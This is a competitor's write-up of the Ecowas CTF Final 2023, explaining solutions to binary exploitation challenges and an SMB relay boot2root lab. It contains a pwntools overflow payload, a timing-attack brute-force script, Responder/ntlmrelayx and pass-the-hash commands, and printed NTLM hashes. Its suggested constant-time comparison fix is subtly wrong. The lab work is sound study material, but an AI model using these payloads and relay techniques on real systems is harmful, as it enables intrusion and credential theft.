<h1> Ecowas CTF Final 2023 </h1>

Hi, I participated in this ctf final as `@Urahara` playing with team `error` from `Nigeria`

I'll give the solution to some of the challenges that I solved and maybe the ones that doesn't require an instance to connect to since most of them are currently down :(

#### Binary Exploitation
- Offset
- Aslr Overflow
- Dep
- Cookie
- Just Login
- Yooeyyeff
- Gigashell
- Leakme
- Chain game

#### Boot2Root
- Relay


### Binary Exploitation

#### Offset:

I won't attach the challenge description cause I can't access the CTFd challenge dashboard again too bad :(

Anyways let's get to it

We are given a binary file checking the file type and the protection enabled on it shows this

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1d8eccc2-bbc2-4fc8-9121-b1726fd77fa0)

So we're working with a x64 binary which is dynamically linked and not stripped and from the result of gotten from running checksec we can see that all protections are enabled 💀

I ran it to get an overview of what it does
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/83318517-7330-4eac-b9a9-8f5a9a00e382)

We can see that on running it we're asked for the offset and when i don't get it then some random values are outputted to my screen

In order to solve this need to know what's going on so I decompiled it using Ghidra

Here's the main function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/71ec891e-1e80-44ac-b63a-ffc7ccd801af)

```c

undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined8 input;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long check;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  input = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  check = 0xcafebabe;
  puts("Do y0u know the right offset?");
  read(0,&input,0x30);
  if (check == 0xdeadbeef) {
    run_command("/bin/cat flag.txt");
  }
  else {
    run_command("/bin/cat /dev/random");
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

Looking at the pseudo code we can see that it initalizes `0xcafebabe` to variable `check` then after it receives our input the value of `check` is being compared with `0xdeadbeef`

If the comparism returns `True` it calls the function `run_command` passing a command to `cat` the `flag` else it `cat /dev/random`

Checking the function `run_command` shows it just triggers `system` on the parameter passed into the function 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/acae91aa-b1e0-4592-a228-2e16122d1072)

So what now?

We know that we need to make `check` equal `0xdeadbeef` and this can be achieved by simply overwriting the value stored in that variable 

So this is just a basic variable overwrite challenge

The way I got this is by getting the offset from our input to the variable and I just looked at the stack frame on ghidra
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/501b0868-4e92-4d08-a1b8-9f3e34f8f530)

Cool it's `0x38 - 0x18 = 32`

So we just need 32 bytes then pass `0xdeadbeef` (packed in endianess) to overwrite the variable to that

Here's my solve script: [link](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/ecowas23/final/offset/solve.py)

```python
from pwn import *

# io = process('./offset')
io = remote('0.cloud.chals.io', 19052) 
context.log_level = 'debug'

offset = 32
overwrite = p64(0xdeadbeef)
payload = b'A'*offset + overwrite
io.sendline(payload)

io.interactive()
```

Running it works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2ae72425-3122-4786-ac8a-e432c18eeeba)

```
Flag: flag{m4th_i5_imp0rtan7_8ut_n0t_r3ally}
```

#### ASLR Overflow [First Blood 🩸]

On checking the file type and protections enabled on the binary showed this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/81eb19c3-f7a3-42ae-a758-dca7cc17696f)

We are working with a x86 binary which is dynamically linked and not stripped, the only protection not enabled is `Stack Canary`

Running it showed this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7251f490-1db9-492e-9590-4f23e25d6f73)

On running it we get a binary section leak and then it receives our input

I decompiled it usnig Ghidra and here's the main function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/aed297f4-6c39-46fe-bdb4-2ee683146746)

Nothing interesting it just calls the `home` function

Checking the decompiled code shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8538a92d-a20e-465e-b0bb-0e92ed34ccb0)

```c

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

void home(void)

{
  char buffer [32];
  code *leak;
  
  leak = home;
  printf("I moved. My new home address is: %p\nCool?\n",home);
  fflush(stdout);
  gets(buffer);
  return;
}
```

Ok cool

This portion of the binary gives us the address of the `home` function then uses `gets()` to receive our input

So we have a buffer overflow because it is impossible to tell without knowing the data in advance how many characters `gets()` will read, and because `gets()` will continue to store characters past the end of the buffer

What now? 

Looking at the other functions shows this

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2730cd9b-c6dc-4997-b18d-78aaffd2bd2e)

The `get_shell` function looks interesting, checking the decompiled code shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6fbe238a-556c-47cc-825a-46dde26f58bf)

Nice this function would spawn a shell, and since it wasn't called in the main function our goal is to overwrite the `EIP` to call the `get_shell` function

The problem here is that PIE is enabled and basically it will randomize the memory address on each program execution

But that's not a problem because we have a leak of the `home` function so we can calculate the `elf` base address

Let's get the offset needed to overwrite the EIP (Instruction Pointer)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c85d1ea2-e885-4186-85d0-76b31a4dabc1)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/83c6db3e-e329-4b01-b99f-13faeb5a123f)

The offset is `48`

At this point we can easily just return to the `get_shell` function

Here's my solve script: [link](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/ecowas23/final/aslr%20overflow/solve.py)

Running it works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f63136f8-89a6-4717-91a8-26525e9efb3c)

Note: I'm running it locally cause remote instance is not accessible 

```
Flag: flag{aslr_makes_addresses_change}
```

#### Dep [First Blood 🩸]

In the attached file holds a binary and a libc file

Since I want to make the binary I'm working on be the same as the one remotely I patched it using `pwninit`

Checking the file type and protections enabled showed this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ebbb0913-6f80-4c30-a682-8e8c88b87c3d)

So we're working with a x64 binary which is dynamically linked and not stripped, the only protection enabled is NX 

Running the binary to get an overview of what it does shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b4bf3c86-2328-4528-8daf-34625b37a544)

It receives our input and prints it out back

On decompiling with Ghidra shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fb0a3cfc-98a2-4607-8905-805999299a89)

The main function just calls the `getpath()` function

Here's the decompiled code
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/dedf3127-668f-49a3-8724-67c375be6641)

```c

void getpath(void)

{
  ulong unaff_retaddr;
  char buffer [76];
  uint ret;
  
  printf("input path please: ");
  fflush(stdout);
  gets(buffer);
  ret = (uint)unaff_retaddr;
  if ((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n",unaff_retaddr & 0xffffffff);
                    /* WARNING: Subroutine does not return */
    _exit(1);
  }
  printf("got path %s\n",buffer);
  return;
}
```

Basically it will ask for input then use `gets()` to receive our input so there's a buffer overflow here

Then it does this weird check and later one prints out our input

Since we have a buffer overflow I decided to then get the offset needed to overwrite the RIP
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a2947331-aec8-49ef-b95e-36da95223d96)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/004b4385-d4a4-4979-a37e-6c968b28cadc)

Cool the offset is `88`

So I then decided to ROP using Return 2 Libc (Ret2Libc) 

But notice that it doesn't use `puts()` anywhere in this program so how do we go about leaking the `got` values to calculate the libc base address?

Well we can alternatively use `printf` and I did this `printf(printf@got)` to leak the libc of `printf@got`

There's usually movaps stack allignment once you jump back to `main` or `getpath` and that's because it starts with `push rbp` 

So to avoid that stack allignment I just jumped to the next address after that assembly instruction

Here's my solve script: [link](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/ecowas23/final/dep/solve.py)

Running it works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/26027892-5d45-4fd3-964e-bec9f36d2772)

```
Flag: EcoWas{They_told_Me_You_Are_A_Master_7846231}
```

#### Cookie [First Blood 🩸]

The attached file here also had a libc file so I patched it with `pwninit`

Now on checking the file type & protections enabled showed this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d112663d-64a1-4dea-b7ef-371cf678c9ee)

So we're working with a x64 binary which is dynamically linked and not stripped, the only protection enabled is NX (No-Execute) & Stack Canary

I ran the binary to get an overview of what it does
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/95a1fbaa-9dc8-46b5-81ee-9271b62287dc)

So it receives our input, prints it out back then asks us if that's all and depending on our option chosen it would either repeat the process or exit

To find the vulnerability I decompiled the binary using Ghidra and here's the main function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2b0900a3-c875-43b9-b63e-f7afa2d10a6d)

Nothing interesting it just calls the `overflow` function

Here's the decompiled code
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/72c7065d-c040-4287-8517-638189869fe8)

```c
void overflow(void)

{
  long in_FS_OFFSET;
  char option;
  char local_11d;
  undefined4 local_11c;
  char story [264];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  local_11c = 0xe4ff;
  do {
    do {
      memset(story,0,0x100);
      puts("Hey, Tell me a story!?\n");
      fflush(stdout);
      read(0,story,0x1000);
      puts("The story says ");
      fflush(stdout);
      puts(story);
      puts("is this the story? (y/n)?");
      fflush(stdout);
      read(0,&option,2);
    } while (option != 'y');
  } while (local_11d != '\n');
  if (canary == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

So it receives our input using `read` which is stored in a buffer `story` that can only hold up to `263` (the additional 1 byte is to null our input) bytes but then `reads` is allowing us to give in up to `0x1000` bytes of data so we have a buffer overflow here

After it receives our input it will then print out the value stored in `story` using `puts` 

Then we have the chance of repeatly calling this again if we give in `y` as the option value or we can exit the program when we give in option `n` so that will `return`

At this point the buffer overflow is clear but we need to deal with the stack canary in place because that would prevent us from smashing the stack

Well because we have the overflow and our input will then be printed out using `puts` we can actually leak the canary value 

If we take a look at `gdb` we'll see that the `canary` is just after the length that the buffer `story` can hold up
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/53c0d44e-670b-480d-8eef-8929b8cce043)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7dc57d37-c598-4a06-8820-84025ce2a45b)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1335d019-8dbc-4271-9013-78287279525a)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4243cdee-a24c-48e2-aed2-4837a3bfd81a)

Btw the breakpoint is set after the `read` call

So we need up to `264` bytes to leak the canary and doing that would overwrite the last byte which is always `00` (that's what make a canary identifiable)

We can also get that offset by looking at ghidra stack frame
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/aecf82c8-5309-4ded-800b-b51650001554)

Since the input buffer is before the canary and the amount of bytes the buffer can hold is `263` that means giving one extra one byte would overwrite the last byte of the canary

Cool we have a way to leak it let's try that
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f63f244a-7314-4e3f-b62a-6c75f49cb493)

Now that we have a way to leak the canary the next thing is to ROP

And what I just did was Ret2Libc

The way to go around that in this case is that when the canary has been leaked inorder to rop we need to first overwrite the canary with it's right value then the saved rbp with junk value then our rop payload

Here's my solve script: [link](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/ecowas23/final/cookie/solve.py)

Running it works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9191d961-6348-499c-a2a2-5fca648d3bf6)

```
Flag: EcoWas{You_Did_It_Again_Gg_25897456}
```

#### Just Login

This challenge had a python file attached and on downloading it gave this content
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/16a63f59-b894-44de-96f0-8541f14d19df)

So basically this program will ask for the password then on giving it the right password we would get the flag

That almost sounds like an impossible thing to solve but notice this portion of the code

```python
    def compare(self, s1, s2):
        try:
            for c in range(len(s2)):
                if s1[c] == s2[c]:
                    # Protect against brute force attacks
                    time.sleep(1)
                    continue
                else:
                    return False
            return True
        except:
            return False
```

The `Challenge` class object has a function `compare` which takes in two parameters `s1 & s2` 

It will iterate through the length of `s2` then compare each character of `s1` to the corresponding character of `s2`

Then it will sleep for 1 second

This function is actually called to check if the provided password is right

```python
    def handle(self):
        self.request.settimeout(5)
        data = "[ LOGIN ] Welcome to my customer remote server. What's the password?\n"
        self.request.sendall(data)

        password = 'markuche'
        data = self.request.recv(1024).strip()
        if self.compare(data, password):
            self.request.sendall('flag{fake_flag_for_testing}')
        else:
            self.request.sendall('[ ACCESS DENIED ]\n')
```

I made some editing to the script to work with it locally

Let's take a look closer at the code implementation

We'll assume the `password = markuche` and we tried `input = maaaaaaa`

The code will check the following:
- is `input[0]` = `password[0]`? YES
- is `input[1]` = `password[1]`? YES
- is `input[2]` = `password[2]`? NO
- EXIT

Did you notice?

```
mbbbbbbb       mabbbbbb
YES, NO        YES, YES, NO
```

The second example takes "more time" to execute!

- Guess "aaaaaaaa" -> 30.7ms
- Guess "baaaaaaa" -> 30.3ms
- ....
- Guess "laaaaaaa" -> 29.9ms
- Guess "maaaaaaa" -> 47.3ms 👍
- Guess "mabaaaaa" -> 47.8ms
- ....
- Guess "maraaaaa" -> 61.2ms 👍
- ....

As you can see the code is completely "broken"

The attack idea is that I'll guess the password one character at a time and it would be based on the fact that if the new guess matches more character of the password it will take a longer time

When I solved this it was so early in the morning I haven't slept at that moment so the script I wrote is pretty not optimized but here's it

```python
from pwn import *
import string
from warnings import filterwarnings

filterwarnings("ignore")
context.log_level = 'info'
charset = list(string.printable)

known_char = 'W'
password = known_char + 'a' * 32
delay = 0

while True:
    print(f"Trying password: {password}")
    sleep(1)
    io = remote('0.cloud.chals.io', '27650')
    # io = remote('localhost', '1339')
    info(f"Password: {password}")

    io.recvuntil('password?')
    before = time.time()

    io.sendline(password)
    io.recvuntil('[ ACCESS DENIED ]')

    after = time.time()
    current_delay = after - before
    print(f"Current delay: {current_delay}")

    if current_delay <= delay:
        password = known_char + charset[charset.index(password[2]) + 1] + 'a' * 15
    else:
        delay = current_delay

    io.close()
```

So basically it's more of brute forcing the password via timing based attack then manually changing the index position to brute force once we notice a larger time delay value

After about an hour of patiently doing it automatedly and manually I got the password to be `WizardsAndKnights83` and was able to get the flag to be:

```
Flag: flag{WizardsAndKnights83}
```

I think a mitigation would be to not exit early, remove branches if possible & more generally aim for constant-time code 

Something like this I think:

```python
failed = len(s1) != len(s2)

for i in range(len(s2)):
    failed |= s1[i] == s2[i]

return not failed
```

But we just need the flag and we've gotten it so let's continue 🙂

#### Yooeyyeff

The binary and it's C file was attached

Here's the C file: [src](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/ecowas23/final/yooeyyeff/src.c)

This challenge was more of a logical sort of stuff and not exploitation

And oddly enough the way I solved it was just by luck LOL

In the C file the main function loops 300 times while calling the menu function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1797bf64-f80f-4818-8125-86aab4275f42)

The menu function has 4 cases that's dependent on our input
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/45b495f3-ec35-4b86-b4c7-246b791e0541)

We can:
- Buy clothes
  
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/85d5b6f5-0a22-45f4-914a-9f516b24bdf3)

- Sell clothes
 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f21b1516-3a15-447f-835b-b8b7bea9ec98)

- Queue upgrade clothes

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d602dfc7-aa4a-44ec-9db2-d53db1395ebb)

- Access the flag

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a43c24c3-21d0-4be8-bdf1-e2131cc3a793)

So basically the idea of this challenge is to get money that's greater than 100 but the problem is that on startup we're given 10money and 1 money is equal to 1 swag

In those functions it can manipulate the amount of money we have mostly decreasing it and trying to make sure whatever we do maybe purchase a cloth it would subtract the price from our input

And some other things but it always make sure we don't try phishy things like using negative numbers

But while I was trying to solve this I was too tired to look at the source code cause it was too intimidating cause it's much

So I started playing with several inputs and eventually after few minutes I was able to increase my money value to be more than 10

I still don't know why or how that works and that's bad maybe I'll look at it again (i didn't care to check why that is so cause of pressure lol)

But once I was able to trigger a set of inputs that would increase the money I had I just wrote a solve script to make the money greater than 100 and get the flag

Here's my solve script: [link](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/ecowas23/final/yooeyyeff/solve.py)

Running it works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a0f789de-eb79-4a81-89d9-802be4bf827a)

```
Flag: flag{ur_n0t_r0b1n_h00d_ur_just_r0b1n}
```

#### Gigashell

Downloading the binary and checking the file type shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/20a4b14f-b083-436b-a82f-a3e14bcc1a17)

We're working with a x64 binary which is dynamically linked and not stripped

The only protection enabled is just PIE and Full RELRO 

Running the binary to get an overview of what it does shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9e94015a-023d-4424-b513-91b0c2ab730d)

It crashes after given an input weird!

Using ghidra I decompiled the binary here's the main function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8cf52e34-bcab-4de3-b55b-7a353d2d9565)

```c

bool main(void)

{
  int fp;
  
  puts("WHERES YOUR EXEC NOW!!!!!!!!!!!!:");
  fgets(shcode,0x400,stdin);
  strtok(shcode,"\n");
  fp = install_syscall_filter();
  if (fp == 0) {
    (*(code *)shcode)();
  }
  return fp != 0;
}
```

It will receive at least `0x400` bytes of input and store it in the `shcode` global variable

Then it removes the newline character from it, then installs some syscall filter

If the return value from that function is `0` it will execute the value stored in the global variable

So this is a shellcoding challenge

Looking at the `install_syscall_filter` function shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c6d0780d-11c1-4154-ada1-7c0e371e41f0)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/91cfdde3-1d5c-4d41-bcb8-c955f4e86874)

Basically what that does is to add SECCOMP rules that filters some syscall

Using `seccomp-tools` I dumped the list of allowed syscalls
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/19fe2b3d-95d6-4dc5-a0cc-0e7ac62f1956)

```
➜  gigashellpwn seccomp-tools dump ./gigashell
WHERES YOUR EXEC NOW!!!!!!!!!!!!:

 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x06 0x00 0x00 0x00000000  return KILL
➜  gigashellpwn
```

Looking at this we can see that only Open, Read & Write syscall are allowed

And the challenge description says that the flag is a file called `flag`

So the idea is simple we need to open up the file, read it's content then write it to stdout

I used pwntools to just generate it for me but then I noticed something
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5898da92-de65-4ef6-a4d8-b40779c96940)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/64e1ef25-1b14-4624-80f4-0dd02d5d5b82)

It isn't working why?

I spent some time on it but then I noticed it won't even execute the first instruction of the shellcode

I made just a nop instruction to see if it would execute
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a0bf00ce-e124-4181-9435-10c39d23a3ee)

When I ran that I saw there's nothing wrong with the instruction as it's going to `call rdx` which is where our shellcode will later be stored in 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cdd065c6-b8e9-4aa2-980e-86b83ea79a08)

But at the point it called the `rdx` to execute the shellcode I got a segfault
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8e993a00-35cc-4f16-8495-bf88c773f21b)

That's not suppose to happen what's the issue?

Well after looking at the permission of the section where our input will be stored I saw this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/278dc0bc-b850-4bfd-97cf-ac51e0ca2de4)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/72aacb3d-a07c-4638-92ab-c6e70a3f11da)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e135d769-406e-4675-9b6d-37ef93fc787d)

The permission as to where our shellcode will be stored is just read & write and not read || write & execute

That's why the shellcode could not execute

So ideally to me this isn't possible to solve since the shellcode won't execute so I layed a complain to the admin multiple times but they kept on telling me that since it had a solve already then it's right and they seemed to have a working solution screenshot which I'm thinking isn't the same as the binary being uploaded to the challenge dashboard but it had a solve still, so if anyone knows a way to solve this "PLS DM ME ON DISCORD"

### Boot2Root

#### Relay [First Blood 🩸]

The challenge description gave two ip addresses and was saying something related to checking every 3 minutes

On scanning the first host showed it wasn't up idk why but the second host gave this result
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/54a49384-0339-41f3-b73b-9cdbaa8ae9db)

On checking smb showed that we don't have anonymous access to list shares 

From the challenge name I just guessed it's going to be SMB Relay attack

But before I proceeded I checked if it allowed SMB Signing which would allow SMB Relay and yes it was enabled

So I just turned off SMB in my responder configuration file then ran this command

```
sudo responder -I wlan0 -v
```

My network interface was on `wlan0` so to then perform the smb relay I ran this command

```
sudo ntlmrelayx.py -t 192.168.31.209 -smb2support
```

It took more than 3 minutes but after like 5 or so I got some hashes on responder end

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:10eca58175d4228ece151e287086e824:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Isid0r3:1000:aad3b435b51404eeaad3b435b51404ee:7206e0a2cf25283655641be7e2954bf4:::
```

I didn't even attempt to crack the hash so I just did PassTheHash (PTH) via `impacket-psexec` then on trying for the users it worked for `Isid0r3` and the flag was in a file `Administration.txt` in the user's desktop directory

```
Flag: EcoWasCTF{Gg_You_Got_me_Yeah_789456123}
```


This CTF was an interesting one and I meet tons of cool people there 
